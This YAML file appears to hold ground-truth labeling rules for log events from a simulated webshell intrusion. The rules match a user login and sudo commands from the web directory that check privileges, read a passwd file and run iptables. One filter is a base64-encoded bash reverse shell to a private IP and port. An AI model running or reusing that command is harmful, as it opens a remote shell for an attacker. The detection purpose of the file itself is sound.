# Bash / Reverse Shell via Webshell
- id: open_reverse_shell
  ground_truth_label: open_reverse_shell
  sensitivity: moderate
  filter:
    - 'WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjIyNi43MS80MzI5NDsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D'

# User Login Activity in Server
- id: login_user
  ground_truth_label: login_user
  sensitivity: moderate
  filter:
    - systemd-logind
    - new session
    - jwilkinson

# Sudo Check from Web Directory
- id: check_sudo
  ground_truth_label: check_sudo
  sensitivity: moderate
  filter:
    - "[sudo]"
    - var/www
    - COMMAND=list

# Sudo passwd from Web Directory
- id: sudo_read_passwd
  ground_truth_label: sudo_read_passwd
  sensitivity: moderate
  filter:
    - "[sudo]"
    - var/www
    - COMMAND=/bin/cat
    - /passwd

# Sudo IP Tables from Web Directory
- id: sudo_iptables
  ground_truth_label: sudo_iptables
  sensitivity: moderate
  filter:
    - "[sudo]"
    - var/www
    - COMMAND=/sbin/iptables